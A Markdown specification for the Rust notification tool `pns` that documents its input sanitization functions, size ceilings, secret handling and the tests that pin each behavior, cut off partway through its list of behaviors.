# Privacy and hostile input

## Scope

Everything `pns` does to keep private content out of places it must not reach, and everything it does to
survive data it did not write. Six families are covered: text flattening (`hooks::flattened`,
`render::flatten_reply`, `render::clipped`), Unicode format character stripping (`recap::is_invisible`,
`main::rendered_plainly`, `recap::safe_line`), path traversal and identifier safety (`src/safety.rs`, the
four predicates and their callers), the decision ring's printability rule (`decision_log::printable` and
the escape rule the doctor reads it back under), the byte and character ceilings on every externally
supplied field and every file or child this binary reads, and secret handling (the moshi token, the
hermes signing key, the hue application key and the router API key, plus what the setup wizard echoes).
Everything below is derived from the crate at `dot_local/share/pns` and its tests only. Where the code
does not settle a question, the line begins `NOT ESTABLISHED:` and names what was looked for and where.
No operator config or state directory was read to write this; every quoted secret value is a literal that
appears in a test file.

## Sanitization

| Function                            | Strips or replaces                                                                                                                                                                                                                               | Leaves alone                                                                                   | Applied at                                                                                                                                                                                                      | Deliberately NOT applied at, and why                                                                                                                                                                                                                                                                                                                                                       | Tests                                                                                                                                                                                                                                                                                                                                 |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hooks::flattened`                  | Every run of `char::is_whitespace()` or `char::is_control()` becomes ONE space; both ends trimmed. `char::is_control` is exactly the Cc set (C0, DEL, C1), chosen by category rather than by codepoint range                                     | Every Unicode format (Cf) character, every multibyte character, globs (`*.jsonl`), punctuation | `hooks::parse_payload` on the `message` and `detail` reads; `hooks::tool_request` on `tool_name`; `hooks::elicitation_request` on both halves; `hooks::one_line` on every string it walks, object KEYS included | `session_id`, `cwd`, `transcript_path`, `file_path`: "a path or a session id is matched and opened rather than rendered, and flattening one would rewrite a name the filesystem gave" (`hooks::parse_payload`). `HookPayload::tool_name` is held RAW and filtered only where it is printed. `last_assistant_message` goes through `render::flatten_reply` instead, which does not strip Cc | `src/hooks.rs:every_class_of_control_byte_is_scrubbed_before_a_line_reaches_a_channel`; `src/hooks.rs:every_payload_string_a_card_is_built_from_is_scrubbed_and_not_the_arguments_alone`; `src/hooks.rs:an_elicitation_prompt_is_kept_to_one_line_and_cut_from_the_head_too`                                                          |
| `render::flatten_reply`             | Runs of EXACTLY four characters (space, tab, carriage return, newline) become one space; ends trimmed; the TAIL survives `max_chars`                                                                                                             | Form feed U+000C, no-break space U+00A0, every other control byte, every Cf character, globs   | `main::turn_reply` at `REPLY_MAX_CHARS`; `missed_notifications::entry` on all five text fields at the caller's cap; `recap::safe_line` at `usize::MAX` after its own filter has run                             | Nothing widens it to `char::is_whitespace`: "a unicode-aware split ... also eats a form feed and a non-breaking space, silently rewriting text an agent chose to send" (`src/render.rs`)                                                                                                                                                                                                   | `src/render.rs:whitespace_outside_the_four_is_content_the_turn_wrote_rather_than_a_separator`; `src/render.rs:an_over_long_reply_is_cut_to_its_tail`; `src/render.rs:one_character_past_the_cap_is_already_a_cut`; `src/render.rs:the_tail_cut_counts_characters_rather_than_bytes`                                                   |
| `render::clipped`                   | Cuts to `max_chars` characters keeping the HEAD, trailing whitespace trimmed, and MARKS the cut with `…` (U+2026). Never returns more characters than the room it was given, mark included. A room of zero returns empty rather than a bare mark | Anything inside the room                                                                       | `main::config_field`; `recap::safe_line`; `recap::merged`, `recap::noted`, `recap::unreadable`; `render::preview`'s no-sentence-end fallback                                                                    | Not used for a turn's own reply: `flatten_reply` keeps the tail there instead, "because a turn states its conclusion at the end" (`src/render.rs:clipped`)                                                                                                                                                                                                                                 | `src/render.rs` `clipped`/`preview` unit tests                                                                                                                                                                                                                                                                                        |
| `main::rendered_plainly`            | `hooks::flattened`, then every character for which `recap::is_invisible` answers true is DROPPED                                                                                                                                                 | Everything `flattened` leaves                                                                  | `main::model_switch_detail` on `from_model` and `to_model`; `main::config_field`, hence the `ConfigChange` `file_path` and the audit trail's `session_id`                                                       | Every other rendered field. Stated at `main::rendered_plainly`: widening `flattened` itself "would let every other field silently start allowing format characters through too". The two callers earn it because one compares two names for equality and the other writes a path into a durable state file                                                                                 | `tests/hooks.rs:an_auto_switch_strips_a_unicode_format_character_from_the_name`; `tests/hooks.rs:a_hostile_file_path_is_sanitised_before_it_reaches_the_card`; `tests/hooks.rs:an_arabic_letter_mark_in_a_file_path_reaches_neither_the_card_nor_the_audit_trail`                                                                     |
| `recap::safe_line`                  | Every `char::is_whitespace()` becomes a space, then every `char::is_control()` and every `is_invisible` character is DROPPED WHOLE, then `flatten_reply`, then `clipped` to the caller's width                                                   | Ordinary printable text of any script                                                          | `recap::answer` per line at `SUMMARIZED_MAX_CHARS`; `recap::merged` at `SOURCE_MAX_CHARS`; `recap::noted` on the cite, the heading and the note body; `recap::unreadable` on the cite                           | The MECHANICAL timeline lines (`recap::described`) built from activity ring entries. Those carry `Entry` text as `missed_notifications::entry` wrote it, which is `flatten_reply` only. See behavior 21                                                                                                                                                                                    | `src/recap.rs:a_summarizers_line_cannot_carry_an_invisible_or_a_reordering_character`                                                                                                                                                                                                                                                 |
| `recap::is_invisible`               | Answers true for the whole Unicode 17.0 format (Cf) category, written as 21 explicit ranges because the standard library has no category lookup and the crate takes no dependency for one                                                        | Every non-Cf character. It is a predicate, not a filter; the caller drops                      | `main::rendered_plainly`, `recap::safe_line`                                                                                                                                                                    | Not consulted by `hooks::flattened`, by design (see `rendered_plainly` above)                                                                                                                                                                                                                                                                                                              | `src/recap.rs:is_invisible_agrees_with_unicode_17_0_across_every_code_point` checks it against an independently transcribed copy of `DerivedGeneralCategory.txt` for EVERY valid `char`; `src/recap.rs:a_summarizers_line_cannot_carry_an_invisible_or_a_reordering_character`                                                        |
| `decision_log::printable`           | Empty becomes `none`. Anything with a character outside ASCII alphanumeric plus `.`, `-`, `_` replaces THE WHOLE VALUE with `unprintable`. What survives is cut to `IDENTITY_MAX` = 32 characters. Judged whole FIRST, cut second                | Conforming short identity tokens                                                               | `decision_log::line` on `agent`, `state`, `permission_mode`, `agent_id`, `tool_name`                                                                                                                            | Everything else on a line, because everything else is a number, a boolean, an enum variant name or a plugin name off the compiled roster. It is also deliberately NOT `safety::route_name_is_usable`: "borrowing it ... would make it two rules wearing one spelling" (`src/decision_log.rs:printable`)                                                                                    | `src/decision_log.rs:an_agent_or_state_outside_the_printable_allowlist_is_recorded_as_unprintable`; `src/decision_log.rs:a_payload_field_outside_the_printable_allowlist_is_recorded_as_unprintable`; `src/decision_log.rs:no_free_text_reaches_a_line_and_the_pane_appears_only_as_two_booleans`                                     |
| `decision_log::escaped`             | `str::escape_debug`, so a control byte is printed as the characters that SPELL it (`\u{1b}`, `\t`) rather than executed                                                                                                                          | Ordinary text                                                                                  | `decision_log::render` on a parsed entry's body and `decision_log::complaint` on an unreadable one, both arms of the doctor's decision ring section                                                             | Nowhere else. It is an escape rather than a drop because the reader is an operator on a terminal asking what happened, so "an escape is evidence" (`src/recap.rs:safe_line` states the contrast)                                                                                                                                                                                           | `src/decision_log.rs:an_unreadable_entry_is_quoted_short_and_with_its_control_bytes_escaped`; `src/decision_log.rs:a_parsed_entrys_body_is_escaped_by_the_same_rule_an_unreadable_one_is`                                                                                                                                             |
| `doctor::printable`                 | Keeps only the space character and `char::is_ascii_graphic()`; everything else, control bytes and all non-ASCII alike, is dropped. Then `take(RELAY_MAX)` = 200 characters                                                                       | Printable ASCII and spaces                                                                     | `doctor::pairing_lines` on moshi's relayed `server:` sentence; `doctor::said_of` on `displayName` and `hostId`                                                                                                  | Not shared with `decision_log::printable`: "that rule judges a short identity token ... while this judges a relayed English sentence full of spaces, parentheses, quotes and colons" (`src/doctor.rs:printable`)                                                                                                                                                                           | `src/doctor.rs:a_relayed_value_carrying_a_newline_or_a_control_byte_cannot_forge_a_report_line`; `src/doctor.rs:an_identity_moshi_named_cannot_forge_a_report_line_either`; `src/doctor.rs:an_over_long_relayed_value_stops_at_the_cap`                                                                                               |
| `banner::verbatim_argument`         | Prefixes ONE unconditional backslash                                                                                                                                                                                                             | Everything else; the value is otherwise verbatim                                               | `banner::notifier_args` on the title and the preview                                                                                                                                                            | Not applied to the `-activate` bundle id or the `-execute` click string, which are composed here rather than supplied                                                                                                                                                                                                                                                                      | `src/channels/banner.rs:every_case_in_the_matrix_encodes_to_its_exact_argv_value`                                                                                                                                                                                                                                                     |
| `home::client_label`, `home::spell` | Rust `{:?}` Debug formatting, which quotes and escapes control bytes and quotes                                                                                                                                                                  | Nothing dropped                                                                                | The home probe's staleness evidence printed to stdout; every `SetupFailure` and config refusal that echoes what the operator wrote                                                                              | The alert BODY, which is built from config KEY NAMES only, so no router text can ride out to a channel                                                                                                                                                                                                                                                                                     | `tests/dispatch.rs:the_alert_carries_no_secret_and_no_raw_router_text`                                                                                                                                                                                                                                                                |
| `safety::pane_is_safe`              | Refuses (answers false), never rewrites. Allowlist: non-empty, every character ASCII alphanumeric or one of `.`, `_`, `:`, `-`                                                                                                                   | Nothing is edited; a safe pane passes through byte for byte                                    | `engine::decide` computes `pane_dropped`; `channels::moshi::herdr_link` asks again at the link                                                                                                                  | Not asked of the `-execute` string directly; the composition root substitutes `""` for a dropped pane once, before any channel is handed it                                                                                                                                                                                                                                                | `src/safety.rs:a_pane_id_carrying_a_single_metacharacter_is_refused`; `src/safety.rs:a_herdr_pane_id_is_safe_colon_and_all_or_no_banner_can_focus_a_pane`; `src/safety.rs:the_allowlist_is_ascii_so_a_letter_from_outside_it_is_refused`                                                                                              |
| `safety::pane_file_is_safe`         | `pane_is_safe` AND no `..` anywhere AND `lights::working_owner` finds no working-file shape                                                                                                                                                      | Same                                                                                           | `lights::lease_marker`, `lights::release_lease`                                                                                                                                                                 | Not used where a pane becomes a shell word or a URL query value, where `..` is inert                                                                                                                                                                                                                                                                                                       | `src/safety.rs:a_pane_id_that_names_a_file_keeps_its_colon_and_loses_its_parent_reference`; `src/safety.rs:a_pane_id_shaped_like_a_working_file_never_names_a_lease`                                                                                                                                                                  |
| `safety::session_id_is_safe`        | Non-empty, no `..`, every character ASCII alphanumeric or `.`, `_`, `-` (no colon), and no working-file shape                                                                                                                                    | Same                                                                                           | `main::turn_marker`, `lights::blocked_marker`, `nag`'s job id check                                                                                                                                             | Not used for the nag job id itself, which needs the colon (`src/daemon.rs`)                                                                                                                                                                                                                                                                                                                | `src/safety.rs:a_session_id_carrying_a_path_separator_is_refused`; `src/safety.rs:a_session_id_carrying_a_parent_reference_is_refused_even_though_dots_are_allowed`; `src/safety.rs:a_session_id_carrying_a_colon_is_refused_unlike_a_pane_id`; `src/safety.rs:the_session_allowlist_is_ascii_too_because_a_filename_gets_normalised` |
| `safety::route_name_is_usable`      | Non-empty and every BYTE ASCII alphanumeric or `-` or `_`                                                                                                                                                                                        | Same                                                                                           | `channels::hermes::channel_url`; `home::stale_alert_channel`                                                                                                                                                    | ONE rule for both readers on purpose: two spellings "would mean a value one waved through and the other refused, which is a route silently swapped for the default"                                                                                                                                                                                                                        | `src/channels/hermes.rs:one_rule_judges_a_route_name_wherever_it_is_read`; `src/channels/hermes.rs:a_name_that_could_not_be_a_path_segment_is_refused_not_glued`                                                                                                                                                                      |

## Ceilings

| Field or read                                                          | Ceiling                                                                                                             | At the ceiling                                | One step past it                                                                                                                                                                                                    |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Harness payload on stdin (`main::read_payload`)                        | `MAX_PAYLOAD_BYTES` = 1,000,000 bytes, plus a `payload_deadline()` of 5 s (`PNS_PAYLOAD_DEADLINE_MS`)               | Whole. Forwarded to moshi and carded normally | `payload_is_whole` answers false. The payload is NOT forwarded (nothing reaches moshi); the notification still goes out. The reader asks for `MAX_PAYLOAD_BYTES + 1` bytes precisely so the two are distinguishable |
| A turn's reply (`main::turn_reply`)                                    | `REPLY_MAX_CHARS` = 8,000 characters                                                                                | Left whole                                    | The TAIL of 8,000 characters survives; the head is dropped                                                                                                                                                          |
| Phone card and banner preview (`render::preview`)                      | `PREVIEW_MAX_CHARS` = 260 characters                                                                                | Passes through untouched                      | Cut at the last sentence end that still fits, else `clipped` with an `…`                                                                                                                                            |
| `ConfigChange` `file_path` (`main::config_field`)                      | `CONFIG_PATH_MAX_CHARS` = 1,024 characters                                                                          | Whole                                         | Head kept, `…` appended. macOS `PATH_MAX`; a long Linux path IS visibly clipped, with the cut marked                                                                                                                |
| `ConfigChange` `session_id` in the audit trail                         | `CONFIG_SESSION_MAX_CHARS` = 64 characters                                                                          | Whole                                         | Head kept, `…` appended                                                                                                                                                                                             |
| Activity ring text fields (`main::ACTIVITY_MAX_CHARS`)                 | 120 characters each, five fields                                                                                    | Whole                                         | Tail kept (`flatten_reply`), head dropped                                                                                                                                                                           |
| Journal (missed notifications) text fields                             | `render::PREVIEW_MAX_CHARS` = 260 characters each                                                                   | Whole                                         | Tail kept                                                                                                                                                                                                           |
| Decision ring identities (`decision_log::IDENTITY_MAX`)                | 32 characters, after the allowlist has judged the WHOLE value                                                       | Whole                                         | First 32 characters kept. Every accepted byte is ASCII, so the cut can never land inside a multibyte character                                                                                                      |
| Doctor quote of an unreadable ring entry (`decision_log::QUOTED_MAX`)  | 60 characters                                                                                                       | Whole                                         | First 60 kept, then escaped                                                                                                                                                                                         |
| moshi relayed sentence and identity fields (`doctor::RELAY_MAX`)       | 200 characters, counted AFTER the ASCII filter                                                                      | Whole                                         | First 200 kept. A value with nothing printable in it relays no line at all                                                                                                                                          |
| `moshi-hook status` answer (`doctor::ANSWER_MAX`)                      | 1 MiB, checked by `doctor::within_cap` BEFORE either parse or scan                                                  | Read and parsed                               | Refused with `moshi-hook answered something this cannot read.` The reader's own ceiling is `PAIRING_READ_MAX` = 2 MiB, twice this, so an over-cap answer still ARRIVES to be refused here                           |
| `moshi-hook status` read (`main::PAIRING_READ_MAX`)                    | 2 MiB (`2 * doctor::ANSWER_MAX`)                                                                                    | Answer returned                               | No answer at all. Reported as `moshi-hook did not answer`, an accepted limit stated at the constant: a wedged daemon streaming prose is diagnosed as a dead one                                                     |
| Summarizer answer (`recap::MAX_ANSWER_BYTES`)                          | 16 KiB, and the seam is asked for `MAX_ANSWER_BYTES + 1`                                                            | Parsed into timeline lines                    | `recap::answer` returns `None`; the plain list is posted instead. An answer containing U+FFFD is also refused wholesale                                                                                             |
| One summarizer line (`recap::SUMMARIZED_MAX_CHARS`)                    | 120 characters                                                                                                      | Whole                                         | Head kept, `…` appended                                                                                                                                                                                             |
| Recap message (`recap::MAX_LINES`, `recap::MAX_CHARS`)                 | 25 lines and 1,800 characters                                                                                       | Fitted whole                                  | `recap::fit` trims. The one thing allowed past the budget is a NEEDS YOU list longer than the budget itself                                                                                                         |
| Pull request summary shown to a summarizer (`recap::SOURCE_MAX_CHARS`) | 400 characters                                                                                                      | Whole                                         | Head kept, marked                                                                                                                                                                                                   |
| Review note shown to a summarizer (`recap::NOTE_SOURCE_CHARS`)         | 1,200 characters                                                                                                    | Whole                                         | Head kept, marked                                                                                                                                                                                                   |
| A receipt (`recap::CITE_MAX_CHARS`)                                    | 60 characters                                                                                                       | Whole                                         | Head kept, marked                                                                                                                                                                                                   |
| One external line's width (`recap::EXTERNAL_MAX_CHARS`)                | 88 characters, prefix `- ` included                                                                                 | Whole                                         | Text cut to 86, marked                                                                                                                                                                                              |
| Transcript read (`main::TRANSCRIPT_TAIL_BYTES`)                        | 4,000,000 bytes of the TAIL, and the file type is checked on `symlink_metadata` before the open                     | Read                                          | Only the last 4 MB is read. `take` is applied as well as the seek, "the file can grow between the two calls"                                                                                                        |
| Decision ring and journal read-back (`main::RING_READ_MAX`)            | 256 KiB                                                                                                             | Read and pruned                               | `readable_ring` returns `FileTooLarge`. `append_ring_line`'s heal fires and the file is republished holding ONLY the line just written                                                                              |
| Activity ring read-back (`main::ACTIVITY_READ_MAX`)                    | 1 MiB, sized against 150 entries of 5 fields of 120 control characters at 6 escaped bytes each (552,000 bytes, 53%) | Read and pruned                               | Same heal, same collapse to one line                                                                                                                                                                                |
| Review note read (`main::NOTE_READ_MAX`)                               | 64 KiB, through a handle opened `O_NOFOLLOW` and re-checked after the open                                          | Read                                          | Truncated silently at 64 KiB                                                                                                                                                                                        |
| `gh pr list` output (`main::GH_READ_MAX`)                              | 512 KiB, with `GH_LIMIT` = 50 per repository and `GH_DEADLINE` = 30 s                                               | Parsed                                        | The JSON is truncated, fails to parse, and the section reports as unavailable. The accepted limit is stated: it reads as "unavailable" with no hint that size was the reason                                        |
| Every other child process (`system::PROBE_READ_MAX`)                   | 1 MiB and `PROBE_DEADLINE` = 5 s                                                                                    | Answer returned                               | No answer. `run_bounded` asks for `max_bytes + 1` and refuses the lot, because "a truncated answer is the dangerous shape here"                                                                                     |
| Any state ring file                                                    | Must be a regular file (`symlink_metadata`), else `InvalidInput`                                                    | Appended                                      | Refused untouched, never repaired. `install -d`-style following of a link is what this exists to avoid                                                                                                              |
| Config sync deadline (`hermes::MAX_SYNC_DEADLINE_SECS`)                | 86,400 s                                                                                                            | Used                                          | Clamped to 86,400                                                                                                                                                                                                   |

## Secrets

| Secret                                           | Comes from                                                                                       | Legitimately goes to                                                                                                                                                                                                    | Must never go to                                                                                                                                                                                                                                                        | Test that pins the prohibition                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| moshi token                                      | `[plugins.mobile] token` in `~/.config/pns/config.toml`, read by `channels::moshi::moshi_secret` | The JSON request body of one HTTPS POST, as `"token"` (`channels::moshi::webhook_body`)                                                                                                                                 | argv, a child's environment, any printed line, any error string, any log or ring entry                                                                                                                                                                                  | `tests/native.rs:native_moshi_posts_the_token_in_the_body_and_never_in_the_engines_own_output` (asserts absence from stdout AND stderr); `tests/native.rs:a_dead_moshi_endpoint_is_silent_because_the_only_report_would_carry_the_token`; `tests/dispatch.rs:the_doctor_names_the_type_when_the_type_is_the_fault_and_never_the_token` (a `type` fault names `type`, never `token`)                                                                                                                                                          |
| hermes signing key                               | `[plugins.hermes] key`, read by `channels::hermes::hermes_secret`                                | Nowhere on the wire. It is consumed IN PROCESS by `channels::hermes::sign` to produce a lowercase hex HMAC (hash-based message authentication code) over the exact body bytes, sent as the `X-Webhook-Signature` header | argv, a child's environment, any printed line, the request body, an error string. `outcome_line` and `skipped_line` name the CONFIG KEY (`[plugins.hermes] key`) and never a value                                                                                      | `tests/dispatch.rs:the_alert_carries_no_secret_and_no_raw_router_text` (asserts `hermes-signing-secret` is absent from the delivered event, stdout and stderr)                                                                                                                                                                                                                                                                                                                                                                               |
| router API key                                   | `[plugins.router] api_key`, read by `home::router_api_key`                                       | The `X-API-KEY` header of one LAN GET to the router (`home::UniFiRouter`)                                                                                                                                               | argv, a child's environment, an error string, any type deriving `Debug`. The doc comment states the rule: "the key never enters a type that derives Debug, so it cannot ride a formatted dump into a log line"                                                          | `tests/dispatch.rs:the_alert_carries_no_secret_and_no_raw_router_text` (asserts `k-123` is absent from the delivered event, stdout and stderr)                                                                                                                                                                                                                                                                                                                                                                                               |
| hue application key                              | `[plugins.hue] key`, read by `channels::hue::hue_settings`                                       | The `hue-application-key` header of LAN GET and PUT calls to the bridge (`channels::hue::UreqBridge`)                                                                                                                   | argv, a child's environment, a printed line                                                                                                                                                                                                                             | `NOT ESTABLISHED:` no test found that asserts the hue key is absent from stdout, stderr, or an event. Searched `tests/` for the key names used in hue fixtures (`"k"`, `do-not-echo-this-hue-key`) and for absence assertions; the only one is `tests/setup.rs:a_secret_typed_into_setup_never_reaches_the_pty_output`, which covers the WIZARD path only, not the delivery path. The structural argument (the key is held in `UreqBridge.key` and only ever passed to `.header(...)`, and hue delivery reports nothing) is code, not a test |
| Every plugin secret, as text in the config file  | The config file itself                                                                           | Parsed into `PluginEntry::settings`                                                                                                                                                                                     | A `ConfigError` detail, which travels to log lines. `config::parse_config` rebuilds a TOML parse failure from the cause and the LINE NUMBER alone, because "the parser's Display echoes the offending source line, and this file carries plugin secrets into log lines" | `src/config.rs:a_malformed_line_is_reported_without_echoing_its_value` (plants `SUPERSECRET` in a malformed line and asserts the refusal does not contain it)                                                                                                                                                                                                                                                                                                                                                                                |
| Every secret typed into `pns setup`              | The operator's keystrokes on a terminal                                                          | The published `~/.config/pns/config.toml`, mode `0600` (`main::CONFIG_FILE_MODE`)                                                                                                                                       | The terminal. `main::ask_hidden` clears `ECHO` and sets `ECHONL` via `tcsetattr` with `TCSAFLUSH`, arming BEFORE the prompt prints, and restores the terminal when its guard drops                                                                                      | `tests/setup.rs:a_secret_typed_into_setup_never_reaches_the_pty_output`, which arms all four secret branches with distinct sentinels, asserts `ECHO` is already off while the first prompt is visible, asserts none of the four reaches the pseudoterminal transcript, asserts an ordinary `[y/N]` answer DOES still echo, asserts the published file is `0600`, and asserts echo is restored after exit                                                                                                                                     |
| The chezmoi-managed config template's secrets    | KeePassXC, resolved at apply time                                                                | A `{{ ... \| toToml }}` action in `dot_config/pns/private_config.toml.tmpl`                                                                                                                                             | `dot_config/pns/config-values.toml`, which carries only the keepassxc ENTRY NAME and FIELD, never a value (`config_text::secret_action` admits exactly the keys `keepassxc` and `field`, and `field` only from `SECRET_FIELDS`)                                         | `src/config_text.rs:a_secret_tables_unknown_member_is_named_rather_than_only_counted`; `src/config_text.rs:a_secrets_field_is_whitelisted_to_the_two_chezmoi_methods`; `src/config.rs:the_shipped_template_names_the_entry_and_field_of_every_secret`                                                                                                                                                                                                                                                                                        |
| The condenser's access to live Codex credentials | `~/.config/pns/codex-home`, a stripped Codex home with the live auth SYMLINKED                   | The condenser child, which runs `codex exec --ephemeral --skip-git-repo-check -s read-only`                                                                                                                             | Any other reader: the directory is created with mode `0700` (`main::condenser_home`) and the config inside it with `0o600`                                                                                                                                              | `NOT ESTABLISHED:` no test found asserting the mode of the condenser home or its config file. The modes are set at `src/main.rs:condenser_home` and `src/main.rs:2306`; nothing in `tests/` reads them back                                                                                                                                                                                                                                                                                                                                  |

## Behaviors

### 1. A payload string becomes one rendered line, control bytes included

Given a harness sends a hook payload whose `message`, `detail`, `error`, `tool_name` or `tool_input`
carries a newline, an escape sequence, a bell or any other C0, DEL or C1 byte

When `hooks::parse_payload` composes the card's message

Then every run of whitespace or control characters is one space, the ends are trimmed, and the whole
value is one line

- Success: `hooks::flattened` splits on `char::is_whitespace() || character.is_control()`, drops empty
  words and joins with one space. `hooks::one_line` routes every string it walks through it, including an
  object's KEYS, "because an object's key is written by whoever wrote its value".
- Failure sources: a payload that does not parse as JSON at all, which yields `HookPayload::default()`
  and an empty message, never an error.
- Fail direction: fail-closed toward scrubbing. Nothing is passed through as suspicious; the category is
  refused wholesale. The scrub is written as one CATEGORY test (`char::is_control` is exactly Cc), not a
  codepoint range, so it cannot acquire a single-codepoint exemption.
  `src/hooks.rs:every_class_of_control_byte_is_scrubbed_before_a_line_reaches_a_channel` walks U+0000 to
  U+001F, U+007F and U+0080 to U+009F individually, "measured, a `flattened` that let U+0002 through
  passed every test in this crate while leaking that byte to a banner".
- Thresholds: no length threshold here. `hooks::TOOL_REQUEST_MAX_CHARS` = 320 caps `tool_request`,
  `reported_error` and `elicitation_request`, each keeping the HEAD; at 320 the value is whole, at 321
  the last character is dropped with no mark.
- Required side effects: none. `src/hooks.rs` is pure by module contract: "the payload arrives as text
  ... and each is turned into a decision without touching the world".
- Forbidden side effects: no file, no spawn, no print.
- Timeout and cancellation: Not applicable. Pure function.
- Idempotency and duplicates: `flattened` is idempotent; its output contains no whitespace runs and no
  control characters, so a second pass is the identity.
- Privacy: the flattened message reaches the banner, the phone card preview and the hermes body. It is
  the operator's own content by construction; nothing here reduces it.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the four-character set of `render::flatten_reply` and the category set of
  `hooks::flattened` are DIFFERENT sets on purpose and both are pinned. Widening either changes what a
  turn is allowed to say.

### 2. Ordinary multibyte text survives every scrub

Given a reply, a tool argument or a relayed line containing `café`, `日本語`, `→ ✓ ×` or `naïve résumé ½ ±`

When it passes through `hooks::flattened` or `hooks::one_line`

Then it arrives byte for byte unchanged

- Success: the scrub is by Unicode category, never by byte or codepoint range. "a range test written in
  bytes would cut a character in half and a range written in codepoints would have to restate the same
  set worse" (`src/hooks.rs:flattened`). Pinned by the final block of
  `src/hooks.rs:every_class_of_control_byte_is_scrubbed_before_a_line_reaches_a_channel`.
- Failure sources: none available. There is no path where a non-control, non-whitespace character is
  removed by `flattened`.
- Fail direction: fail-open toward the operator's own prose. This is the deliberate counterweight to
  behavior 1: a scrub that took multibyte text with it would silently rewrite what an agent chose to
  send.
- Thresholds: Not applicable.
- Required side effects: none.
- Forbidden side effects: none.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: identity.
- Privacy: unchanged content means unchanged exposure; see behavior 19 for where it then goes.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `render::flatten_reply` keeps form feed U+000C and no-break space U+00A0 as
  CONTENT while `hooks::flattened` treats both as separators (`char::is_whitespace` covers U+00A0). The
  two functions disagree about those characters by design and both sides are pinned
  (`src/render.rs:whitespace_outside_the_four_is_content_the_turn_wrote_rather_than_a_separator`).

### 3. A Unicode format character never reaches a model name or a config path

Given a `PostModelSwitch` payload whose `to_model` carries U+202E RIGHT-TO-LEFT OVERRIDE, or a
`ConfigChange` payload whose `file_path` carries U+202E or U+061C ARABIC LETTER MARK

When the card's detail is composed

Then the character is gone from the rendered value and from every durable record of it

- Success: `main::rendered_plainly` runs `hooks::flattened` and then filters out every character for
  which `recap::is_invisible` answers true. `main::model_switch_detail` and `main::config_change_detail`
  are its only two callers. Pinned by
  `tests/hooks.rs:an_auto_switch_strips_a_unicode_format_character_from_the_name` (detail reads
  `automatic session model change: claude-sonnet-4-5 to claude-opus-4-6`),
  `tests/hooks.rs:a_hostile_file_path_is_sanitised_before_it_reaches_the_card` (detail reads
  `user settings changed: /a/dotfiles/settings.json`) and
  `tests/hooks.rs:an_arabic_letter_mark_in_a_file_path_reaches_neither_the_card_nor_the_audit_trail`,
  which checks the card AND the `policy-settings-audit` file in one event.
- Failure sources: a model name that is empty once stripped, or two names equal once stripped, both of
  which yield `None` and no card at all (`main::model_switch_detail`).
- Fail direction: fail-closed. The character is DROPPED, not escaped and not passed through with a
  warning. A name that reduces to nothing produces no card rather than a card about nothing.
- Thresholds: `config_field` applies `CONFIG_PATH_MAX_CHARS` = 1,024 to a path and
  `CONFIG_SESSION_MAX_CHARS` = 64 to a session id, both after the strip. At the cap the value is whole;
  one character past it the head survives with `…` appended.
- Required side effects: for `source = "policy_settings"`, one line appended to
  `<state>/policy-settings-audit` (behavior 9).
- Forbidden side effects: no widening of `hooks::flattened` itself. The doc comment states why: two
  callers earn the strip, and moving it inside `flattened` "would let every other field silently start
  allowing format characters through too".
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: `rendered_plainly` is idempotent.
- Privacy: `config_change_detail` deliberately carries no key, no old or new value and no actor. The
  payload does not offer them, and the detail says only WHICH SOURCE and, optionally, WHICH FILE.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `config_source_label` is an EXACT allowlist of five strings (`user_settings`,
  `project_settings`, `local_settings`, `policy_settings`, `skills`). Anything else, including a prefix
  of a real value and a different case, yields `None` and total silence, described as "the Rust-side
  backstop the declaration's matcher alone cannot be trusted to be".

### 4. The invisible-character set is the whole Unicode format category, checked against the standard

Given any `char`

When `recap::is_invisible` is asked about it

Then the answer agrees with Unicode 17.0's `DerivedGeneralCategory.txt` for category Cf, across every
valid code point

- Success: `src/recap.rs:is_invisible_agrees_with_unicode_17_0_across_every_code_point` iterates every
  valid `char` and compares against an INDEPENDENTLY transcribed range table, deliberately not built from
  `is_invisible`'s own ranges.
- Failure sources: a transcription drift in either table.
- Fail direction: fail-closed by construction. The history is in the doc comment: U+061C was found
  missing by one review, then two ranges were found still wrong by a second (U+0890 to U+0891 absent and
  the U+13430 range truncated at U+13438, nine code points short of the 170 the category holds). The
  data-driven check exists "so a third gap fails a test rather than waiting on a third review".
- Thresholds: 170 code points as of Unicode 17.0, spanning 21 ranges from U+00AD SOFT HYPHEN to
  U+E0020..U+E007F.
- Required side effects: none. Pure predicate.
- Forbidden side effects: it is a predicate, never a filter; the caller decides what to do.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: total function.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `pub` for exactly two readers, `recap::safe_line` and `main::rendered_plainly`.
  A Unicode revision that adds a Cf code point makes the crate's table stale, and the test is what says
  so.

### 5. A summarizer's line cannot carry an invisible or reordering character

Given a configured summarizer answers with a line containing U+202E, U+200B, U+FEFF, U+2066 or a raw
escape byte

When `recap::answer` reads it

Then every whitespace character becomes a space, every control and every format character is dropped
whole, and what remains is cut to 120 characters from the HEAD

- Success: `recap::safe_line` runs the four steps in order (whitespace to space, drop control and
  invisible, `flatten_reply` at no cap, `clipped` to the width). Pinned by
  `src/recap.rs:a_summarizers_line_cannot_carry_an_invisible_or_a_reordering_character`, which asserts
  U+061C in particular because it "sat outside the bidi and zero-width characters above it".
